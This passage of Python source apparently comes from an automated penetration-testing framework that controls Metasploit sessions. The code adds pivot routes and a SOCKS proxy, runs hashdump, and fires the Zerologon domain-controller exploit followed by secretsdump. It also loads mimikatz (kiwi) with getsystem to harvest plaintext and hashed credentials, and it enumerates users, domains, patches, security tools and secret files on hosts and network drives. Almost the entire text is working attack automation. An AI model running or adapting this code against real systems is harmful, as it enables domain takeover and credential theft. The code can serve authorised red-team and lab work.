    route = 'route add' + " " + network_addr + " " + netmask + " " + session_num
    #print(route)

    client.consoles.console(cid).write(route)
    time.sleep(10)
    #print(client.consoles.console(cid).read())
    self.mlogger.writelog(client.consoles.console(cid).read(), "info")

    #client.consoles.console(cid).write('route print')
    #time.sleep(10)
    #print(client.consoles.console(cid).read())
    #self.mlogger.writelog(client.consoles.console(cid).read(), "info")


  def unsetting_route(self, network_addr, netmask, session_num):
    client = self.msf_connection()

    print("unsetting routing...")
    self.mlogger.writelog("unsetting routing...", "info")

    cid = client.consoles.console().cid
    #print('cid = {}'.format(cid))

    route = 'route remove' + " " + network_addr + " " + netmask + " " + session_num
    #print(route)

    client.consoles.console(cid).write(route)
    time.sleep(10)
    #print(client.consoles.console(cid).read())
    self.mlogger.writelog(client.consoles.console(cid).read(), "info")

    #client.consoles.console(cid).write('route print')
    #time.sleep(10)
    #print(client.consoles.console(cid).read())
    #self.mlogger.writelog(client.consoles.console(cid).read(), "info")


  def execute_socks(self):
    client = self.msf_connection()

    print("execute a socks proxy...")
    self.mlogger.writelog("execute a socks proxy...", "info")

    run = client.modules.use('auxiliary', 'server/socks_proxy')
    run['VERSION'] = "4a"
    print(run.runoptions)

    job_id = run.execute()
    print(job_id)


  def hash_scrape(self, hashdump):
    #print(hashdump)

    pass_list = []
    hash_list = []
    pass_list.clear()
    hash_list.clear()

    pattern_user_pass = '\[\+\]\s{2}(.*?):"(.*)"'
    pattern_user_hash = '\[\+\]\s{2}(.*?):(.*?):(.*?):::'
  
    #print(res)
    #print(len(res))
  
    res = re.findall(pattern_user_pass, hashdump)

    for i in range(len(res)):
      #print(res[i][0])
      #print(res[i][1])
      pass_list.append(res[i][0])
      pass_list.append(res[i][1].replace('\u0000', ''))

    res = re.findall(pattern_user_hash, hashdump)

    for i in range(len(res)):
      #print(res[i][0])
      #print(res[i][1])
      hash_list.append(res[i][0])
      hash_list.append(res[i][2])

    return pass_list, hash_list

  def get_hash(self, ipaddr, node_num, node):
    client = self.msf_connection()

    #session_num = []
    #
    #print("Sessions avaiables : ")
    #for s in client.sessions.list.keys():
    #  session_num.append(str(s))
    #  print(session_num)

    session_num = node[node_num]['session']

    pass_list = []
    hash_list = []

    client.sessions.session(session_num).write('run post/windows/gather/smart_hashdump')
    time.sleep(10)
    hashdump = client.sessions.session(session_num).read()
    print(hashdump)
    self.mlogger.writelog(hashdump, "info")

    pass_list, hash_list = self.hash_scrape(hashdump)
    print("local_account_pass_list = {}".format(pass_list))
    print("local_account_hash_list = {}".format(hash_list))
    self.mlogger.writelog("local_account_pass_list = " + pprint.pformat(pass_list), "info")
    self.mlogger.writelog("local_account_hash_list = " + pprint.pformat(hash_list), "info")

    node[node_num]['local_account_pass'] = pass_list
    node[node_num]['local_account_hash'] = hash_list

    #print("smbuser = {}, smbpass = {}".format(smbuser, smbpass))
    #node[node_num]['local_account_hash'].append(smbuser)
    #node[node_num]['local_account_hash'].append(smbpass)
    #return smbuser, smbpass


  def check_vm():
    client = self.msf_connection()

    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)

    client.sessions.session(session_num[0]).write('run post/windows/gather/checkvm')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())

    
  def get_dc_info(self, node_num, node):
    client = self.msf_connection()

    session_num = node[node_num]['session']

    print("get domain controller info...")
    self.mlogger.writelog("get domain controller info", "info")

    pattern_domain = '(.*)(FOUND Domain: )(.*)'
    pattern_nbname = '(.*)(FOUND Domain Controller: )(.*)( \(IP: )(.*)'

    client.sessions.session(session_num).write('run post/windows/gather/enum_domain')
    time.sleep(10)
    result = client.sessions.session(session_num).read()

    rows = result.splitlines()
    domain = ""
    nbname = ""
    dc_ipaddr = ""

    for row in rows:
      if "found domain: " in row.lower():
        result = re.match(pattern_domain, row)
        domain = result.group(3).replace('\n', '')
      if "found domain controller: " in row.lower():
        result = re.match(pattern_nbname, row)
        nbname = result.group(3).replace('\n', '')
        dc_ipaddr = result.group(5).replace(')', '').replace('\n', '')

    print("domain = {}".format(domain))
    print("nbname= {}".format(nbname))
    print("dc_ipaddr = {}".format(dc_ipaddr))
    self.mlogger.writelog("domain = " + domain, "info")
    self.mlogger.writelog("nbname = " + nbname, "info")
    self.mlogger.writelog("dc_ipaddr = " + dc_ipaddr, "info")

    node[node_num]['ad_domain'] = domain
    node[node_num]['nbname'] = nbname
    node[node_num]['dc_ipaddr'] = dc_ipaddr


  def secretsdump(self, target, nbname):
    result = subprocess.check_output('proxychains4 python3 ./bin/secretsdump.py -no-pass \'' + nbname + "$@" + target + '\'', shell=True).decode('utf-8')
    rows = result.splitlines()

    account = ""
    hash_value = ""

    pattern = '(.*?):(.*?):(.*?):::'
    
    for row in rows:
      if 'Administrator' in row:
        result = re.match(pattern, row)
        account = result.group(1)
        hash_value = result.group(3)
        
    print("account = {}".format(account))
    print("hash_value = {}".format(hash_value))

    
    return account, hash_value


  def execute_zerologon(self, target, node_num, node, nbname):
    client = self.msf_connection()

    print("execute zerologon...")
    self.mlogger.writelog("execute zerologon...", "info")
    
    cid = client.consoles.console().cid
    #print('cid = {}'.format(cid))
    client.consoles.console(cid).read()

    session_num = node[node_num]['session']

    run = client.modules.use('auxiliary', 'admin/dcerpc/cve_2020_1472_zerologon')
    run['NBNAME'] = nbname
    run['RHOSTS'] = target

    result = client.consoles.console(cid).run_module_with_output(run)
    time.sleep(180)
    print(result)

    account, hash_value = self.secretsdump(target, nbname)
    print("account = {}".format(account))
    print("hash_value = {}".format(hash_value))

    account_info = []
    account_info.append(account)
    account_info.append(hash_value)

    node[node_num]['local_account_hash'] = copy.deepcopy(account_info)
    node[node_num]['success_exploit'].append('auxiliary/admin/dcerpc/cve_2020_1472_zerologon')


  def execute_ipconfig(self, node_num, node):
    client = self.msf_connection()

    session_num = node[node_num]['session']

    print("execute ipconfig...")
    self.mlogger.writelog("execute ipconfig...", "info")
    
    client.sessions.session(session_num).write('ipconfig')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    #print(result)
    self.mlogger.writelog(result, "info")

    ipaddr_info = []
    pattern = '.*( : )(.*)'
    
    rows = result.splitlines()
    
    for row in rows:
      if "ipv4 address" in row.lower():
        result = re.match(pattern, row)
        if (result.group(2) == "127.0.0.1"):
          loopback = 1
        else:
          ipaddr_info.append(result.group(2).replace('\n', ''))
      if "ipv4 netmask" in row.lower():
        result = re.match(pattern, row)
        if (loopback == 1):
          loopback = 0
        else:
          ipaddr_info.append(result.group(2).replace('\n', ''))
    
    print("ipconfig info = {}".format(ipaddr_info))
    self.mlogger.writelog("ipconfig info = " + pprint.pformat(ipaddr_info), "info")
    node[node_num]['ipconfig_info'] = copy.deepcopy(ipaddr_info)

    ipaddr_info.clear()


  def execute_netstat(self, node_num, node):
    client = self.msf_connection()

    session_num = node[node_num]['session']

    print("execute netstat...")
    self.mlogger.writelog("execute netstat...", "info")
    
    client.sessions.session(session_num).write('netstat')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    #print(result)
    self.mlogger.writelog(result, "info")

    netstat_info = []
    pattern = '(.*):(.*)'

    rows = result.splitlines()
    
    for row in rows:
      if "established" in row.lower():
        c = row.split()
        result = re.match(pattern, c[2])
        try:
          netstat_info.append(result.group(1).replace('\n', ''))
          netstat_info.append(result.group(2).replace('\n', ''))
        except:
          pass
    
    print("established network info = {}".format(netstat_info))
    self.mlogger.writelog("established network info = " + pprint.pformat(netstat_info), "info")
    node[node_num]['netstat_info'] = copy.deepcopy(netstat_info)

    netstat_info.clear()


  def execute_ps(self, node_num, node):
    client = self.msf_connection()
    session_num = node[node_num]['session']

    print("execute ps...")
    self.mlogger.writelog("execute ps...", "info")

    client.sessions.session(session_num).write('ps')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(result, "info")

    rows = result.splitlines()
    ps_list = []

    for row in rows:
      c = row.split()
      if len(c) >= 7 and ".exe" in c[2]:
        ps_list.append(c[2])
        #print("process = {}".format(c[2]))

    print("ps_list = {}".format(ps_list))
    self.mlogger.writelog("process list = " + pprint.pformat(ps_list), "info")

    node[node_num]['process_list'] = copy.deepcopy(ps_list)

    json_open = open('./arsenal/security_tool.json', 'r')
    json_load = json.load(json_open)

    st_list = []
    
    for key, values in json_load.items():
      #print(key)
      for value in values:
        for ps in ps_list:
          if (value.lower() + ".exe" == ps.lower()):
            st_list.append(key)
            break

    print("st_list = {}".format(st_list))
    self.mlogger.writelog("security tool list = " + pprint.pformat(st_list), "info")

    node[node_num]['security_tool'] = copy.deepcopy(st_list)

    ps_list.clear()
    st_list.clear()


  def execute_getlogonuser(self, node_num, node):
    client = self.msf_connection()

    print("execute get logon_user info...")
    self.mlogger.writelog("execute get logon_user info...", "info")

    session_num = node[node_num]['session']

    pattern = '(Server username: )(.*)'

    client.sessions.session(session_num).write('getuid')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    rows = result.splitlines()
    
    for row in rows:
      if "server username: " in row.lower():
        result = re.match(pattern, row)
        logon_user = result.group(2).replace('\n', '')

    print("logon user = {}".format(logon_user))
    self.mlogger.writelog("logon user = " + logon_user, "info")

    node[node_num]['logon_user'] = logon_user


  def execute_netuser(self, node_num, node):
    client = self.msf_connection()

    print("execute get local_user info...")
    self.mlogger.writelog("execute get local_user info...", "info")

    session_num = node[node_num]['session']

    client.sessions.session(session_num).write('upload ./bat/net-user.bat')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('execute -f net-user.bat')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('download net-user.log')
    time.sleep(30)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('rm net-user.bat net-user.log')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    local_account= []
    flag = 0

    with open('net-user.log', 'r') as f:
      for row in f:
        if 'command' in row.lower() and "completed" in row.lower():
          break
        elif 'コマンド' in row.lower() and "終了" in row.lower():
          break
        if flag == 1:
          #print(row)
          c = row.split()
          local_account += c
        if '-------' in row:
          flag = 1
    
    print("local account list = {}".format(local_account))
    self.mlogger.writelog("local account list = " + pprint.pformat(local_account), "info")
    node[node_num]['local_account_list'] = copy.deepcopy(local_account)

    local_account.clear()


  def execute_netuserdomain(self, node_num, node):
    client = self.msf_connection()

    print("execute get domain_user info...")
    self.mlogger.writelog("execute get domain_user info...", "info")

    session_num = node[node_num]['session']

    client.sessions.session(session_num).write('upload ./bat/net-user-domain.bat')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('execute -f net-user-domain.bat')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('download net-user-domain.log')
    time.sleep(30)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    client.sessions.session(session_num).write('rm net-user-domain.bat net-user-domain.log')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    pattern = '.*(for domain )(.*)'
    domain_account= []
    flag = 0
    
    with open('net-user-domain.log', 'r') as f:
      for row in f:
        if 'command' in row.lower() and "completed" in row.lower():
          break
        elif 'コマンド' in row.lower() and "終了" in row.lower():
          break
        if 'request' in row.lower() and "processed" in row.lower():
          result = re.match(pattern, row)
          domain_info = result.group(2)[:-1] # delete dot
          print("domain_info = {}".format(domain_info))
        elif '要求' in row.lower() and "処理" in row.lower():
          result = re.match(pattern, row)
          domain_info = result.group(2)[:-1] # delte dot
          print("domain_info = {}".format(domain_info))
        if flag == 1:
          #print(row)
          c = row.split()
          domain_account += c
        if '-------' in row:
          flag = 1
    
    print("domain account list = {}".format(domain_account))
    self.mlogger.writelog("domain account list = " + pprint.pformat(domain_account), "info")
    node[node_num]['domain_account_list'] = copy.deepcopy(domain_account)
    node[node_num]['domain_info'] = domain_info

    domain_account.clear()


  def execute_netuse(self, node_num, node):
    client = self.msf_connection()

    session_num = node[node_num]['session']

    print("execute netuse...")
    self.mlogger.writelog("execute netuse...", "info")

    client.sessions.session(session_num).write('upload ./bat/net-use.bat')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('execute -f net-use.bat')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('download net-use.log')
    time.sleep(30)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    client.sessions.session(session_num).write('rm net-use.bat net-use.log')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    nw_drive = []
    flag = 0

    with open('net-use.log', 'r') as f:
      for row in f:
        if 'command' in row.lower() and "completed" in row.lower():
          break
        elif 'コマンド' in row.lower() and "終了" in row.lower():
          break
        if flag == 1:
          #print(row)
          c = row.split()
          nw_drive.append(c[2])
        if '-------' in row:
          flag = 1

    print("network drive list = {}".format(nw_drive))
    self.mlogger.writelog("network drive list = " + pprint.pformat(nw_drive), "info")
    node[node_num]['network_drive'] = copy.deepcopy(nw_drive)

    nw_drive.clear()


  def execute_creds_tspkg(self, node_num, node):
    client = self.msf_connection()

    session_num = node[node_num]['session']

    print("execute creds_tspkg...")
    self.mlogger.writelog("execute creds_tspkg...", "info")

    client.sessions.session(session_num).write('load kiwi')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    client.sessions.session(session_num).write('getsystem')
    time.sleep(20)
    print(client.sessions.session(session_num).read())
    
    client.sessions.session(session_num).write('creds_tspkg')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    #print(result)
    self.mlogger.writelog(result, "info")

    rows = result.splitlines()
    domain_list = []
    flag = 0
    
    for row in rows:
      if flag == 1:
        #print(row)
        domain_list += row.split()
      if '-------' in row:
        flag = 1
    flag = 0
    
    print("domain password = {}".format(domain_list))
    self.mlogger.writelog("domain password = " + pprint.pformat(domain_list), "info")
    node[node_num]['domain_account_pass'] = copy.deepcopy(domain_list)
    
    domain_list.clear()


  def execute_creds_all(self, node_num, node):
    client = self.msf_connection()

    session_num = node[node_num]['session']

    print("execute creds_all...")
    self.mlogger.writelog("execute creds_all...", "info")

    client.sessions.session(session_num).write('load kiwi')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    client.sessions.session(session_num).write('getsystem')
    time.sleep(20)
    print(client.sessions.session(session_num).read())
    
    client.sessions.session(session_num).write('creds_all')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    print(result)

    rows = result.splitlines()
    domain_list = []
    flag = 0
    
    for row in rows:
      # ユーザアカウントの取得
      if flag == 1:
        #print(row)
        domain_list += row.split()
      # 開始判定
      if '-------' in row:
        flag = 1
    flag = 0
    
    print("domain password = {}".format(domain_list))
    
    domain_list.clear()


  def execute_getospatch(self, node_num, node):
    client = self.msf_connection()

    session_num = node[node_num]['session']

    print("execute get ospatch...")
    self.mlogger.writelog("execute get ospatch...", "info")
    
    client.sessions.session(session_num).write('upload ./bat/systeminfo.bat')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('execute -f systeminfo.bat')
    time.sleep(30)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('download systeminfo.txt')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('rm systeminfo.txt systeminfo.bat')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    # execute wes.py
    try: # todo: setting wes.py directory and path
      result = subprocess.check_output('python3 ../wesng/wes.py --definitions ../wesng/definitions.zip -d --muc-lookup systeminfo.txt | grep -e \"Installed hotfixes\" -e \"CVE\" | sort -u', shell=True).decode('utf-8')
      print(result)
      self.mlogger.writelog("wes.py result = " + result, "info")

    except:
      print("wes.py error!!")
      self.mlogger.writelog("wes.py error!!", "error")

    rows = result.splitlines()

    os_patch_list = []
    local_vuln_list = []

    pattern = '(.*): (.*).*'

    for row in rows:
      if 'Installed hotfixes' in row:
        result = re.match(pattern, row)
        os_patch_str = result.group(2).replace('\n', '')
        os_patch_list = [x.strip() for x in os_patch_str.split(',')]
        break
      else:
        pass

    print("os_patch_list = {}".format(os_patch_list))
    self.mlogger.writelog("os_patch_list = " + pprint.pformat(os_patch_list), "info")
    node[node_num]['os_patches'] = copy.deepcopy(os_patch_list)

    pattern = 'CVE: (.*).*'

    for row in rows:
      if 'CVE' in row:
        result = re.match(pattern, row)
        local_vuln_list.append(result.group(1).replace('\n', ''))
      else:
        pass

    print("local_vuln_list = {}".format(local_vuln_list))
    self.mlogger.writelog("local_vuln_list = " + pprint.pformat(local_vuln_list), "info")
    node[node_num]['local_vuln_list'] = copy.deepcopy(local_vuln_list)
    
    os_patch_list.clear()
    local_vuln_list.clear()


  def execute_getmaindrvinfo(self, node_num, node):
    client = self.msf_connection()

    session_num = node[node_num]['session']

    print("execute get maindrvinfo..")
    self.mlogger.writelog("execute get maindrvinfo...", "info")
    
    client.sessions.session(session_num).write('show_mount')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    self.mlogger.writelog(result, "info")

    rows = result.splitlines()
    print(rows)

    local_drv = []
    flag = 0

    for row in rows:
      if flag == 1 and '.' not in row.lower():
        break
      if flag == 1:
        c = row.split()
        local_drv.append(c[0])
        local_drv.append(c[1])
      if '----' in row:
        flag = 1

    flag = 0
    
    print("local drive = {}".format(local_drv))
    self.mlogger.writelog("local drive = " + pprint.pformat(local_drv), "info")
    node[node_num]['local_drive'] = copy.deepcopy(local_drv)

    local_drv.clear()


  def execute_getlocalsecretinfo(self, node_num, node):
    client = self.msf_connection()

    session_num = node[node_num]['session']

    print("execute get localsecretinfo...")
    self.mlogger.writelog("execute get localsecretinfo...", "info")
    
    client.sessions.session(session_num).write('pwd')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    #client.sessions.session(session_num).write('cd %temp%')
    client.sessions.session(session_num).write('cd C:\\\\Users')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    client.sessions.session(session_num).write('pwd')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    client.sessions.session(session_num).write('ls')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    self.mlogger.writelog(result, "info")

    rows = result.splitlines()
    rows.pop()
    user_list = []
    pwned_user = []
    secret_data = []
    flag = 0

    if node[node_num]['os'] == "Windows":
      for row in rows:
        if flag == 1:
          c = row.split(None, 6)
          user_list.append(c[6])
        if '----' in row:
          flag = 1

      for user in user_list:
        print(user)
        client.sessions.session(session_num).write('cd C:\\\\Users\\\\' + user)
        time.sleep(5)
        client.sessions.session(session_num).write('pwd')
        time.sleep(5)
        result = client.sessions.session(session_num).read()
        if user in result:
          pwned_user.append(user)
          client.sessions.session(session_num).write('cd Desktop')
          time.sleep(5)
          client.sessions.session(session_num).write('ls')
          time.sleep(5)
          result = client.sessions.session(session_num).read()
          time.sleep(5)

          rows = result.splitlines()
          print(rows)
          self.mlogger.writelog(rows, "info")

          for row in rows:
            if "mushikago_secret" in row: 
              #print("find secret_data = {}".format(row))
              secret_data.append(user)
              break
            else:
              pass
        
    print("pwned_user = {}".format(pwned_user))
    self.mlogger.writelog("pwned_user = " + pprint.pformat(pwned_user), "info")
    node[node_num]['pwned_user'] = copy.deepcopy(pwned_user)

    print("secret data = {}".format(secret_data))
    self.mlogger.writelog("secret data = " + pprint.pformat(secret_data), "info")
    node[node_num]['secret_data'] = copy.deepcopy(secret_data)

    pwned_user.clear()
    secret_data.clear()



  def execute_getnwsecretinfo(self, node_num, node):
    client = self.msf_connection()

    session_num = node[node_num]['session']

    print("execute get secretfile into network drive..")

    value = iter(node[node_num]["network_drive"])

    secret_data = -1

    for nwdrv, drv_type in zip(value, value):
      client.sessions.session(session_num).write('pwd')
      time.sleep(10)
      print(client.sessions.session(session_num).read())

      client.sessions.session(session_num).write('cd ' + nwdrv)
      time.sleep(10)
      print(client.sessions.session(session_num).read())

      client.sessions.session(session_num).write('dir')
      time.sleep(10)
      result = client.sessions.session(session_num).read()

      rows = result.splitlines()
      print(rows)

      for row in rows:
        if "mushikago_secret" in row:
          print("find secret_data = {}".format(row))
          secret_data = 1
          break
      else:
        continue
      break
    
    print("secret_data = {}".format(secret_data))
    node[node_num]['secret_data'] = secret_data

    return secret_data

